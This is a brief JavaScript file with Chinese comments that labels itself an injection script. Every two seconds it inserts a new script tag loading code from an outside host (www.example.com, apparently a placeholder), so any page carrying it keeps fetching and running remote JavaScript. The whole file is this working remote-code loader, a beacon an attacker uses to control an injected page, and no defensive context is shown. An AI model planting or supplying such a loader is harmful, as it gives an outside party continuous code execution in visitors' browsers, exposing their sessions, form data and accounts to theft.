//JS注入--请求端脚本
(function () {
    var total = 1; //计数器

    //循环发送请求
    setInterval(function () {
        //新建标签
        var FPlugScript = document.createElement('script');

        //设置各种参数
        FPlugScript.id = 'FPlug_script_' + (total++);
        FPlugScript.src = location.protocol + '//www.example.com?_t=' + new Date().getTime() + '&id=' + FPlugScript.id;

        //将node节点添加到页面中去
        document.body && document.body.appendChild(FPlugScript);
    }, 2000);
})();